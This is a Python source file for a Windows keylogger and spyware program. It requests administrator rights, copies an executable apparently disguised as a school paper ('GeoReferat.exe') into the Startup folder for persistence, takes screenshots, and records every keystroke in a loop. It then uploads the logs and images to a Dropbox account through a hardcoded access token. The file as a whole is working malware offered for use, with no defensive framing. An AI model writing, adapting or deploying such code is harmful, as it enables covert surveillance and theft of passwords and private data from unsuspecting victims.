import keyboard
from time import sleep
import time
import dropbox
import datetime
import pyautogui
import shutil
import os
import sys
import win32com.shell.shell as shell

ASADMIN = 'asadmin'
if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    pass


#pyfile = "C:/Users/Louis/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Autostart"
os.system("move GeoReferat.exe C:/Users/Louis/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")

x = 0

while True:
    date = datetime.datetime.now()
    x = x + 1
    filename = ("log" + str(x) + ".txt")
    file = open(filename, "w+")
    print(filename)
    file = open(filename, "r+")
    file.write(str(date))

    picname = ("pic" + str(x) + ".png")
    picture = pyautogui.screenshot(picname)



    for i in range(10):
        keys = keyboard.record(until="enter")

        for key in keys:
            file = open(filename, "a", encoding="utf-8")

            k = (str(key))
            k = k.strip("KeyboardEvent")
            k = k.strip("()")
            k = k.replace("up", "")
            k = k.replace("down", "")

            print(k)
            file.write(k)
            file.close()

    db = dropbox.Dropbox('TIBvKrzWikAAAAAAAAAAAVC0ZwZnrZXmPIFWxwS7qb-zhYsSm7ucPTyu9NS3uJYE')
    fname = str(filename)
    dname = "/" + "Logs/" + filename
    f = open(fname, 'rb')
    response = db.files_upload(f.read(), dname)
    print('upload:', response)
    f.close()

    f2name = str(picname)
    print(picname)
    d2name = "/" + "Screenshots/" + picname
    f2 = open(f2name, 'rb')
    res = db.files_upload(f2.read(), d2name)
    print(res)
    f2.close()

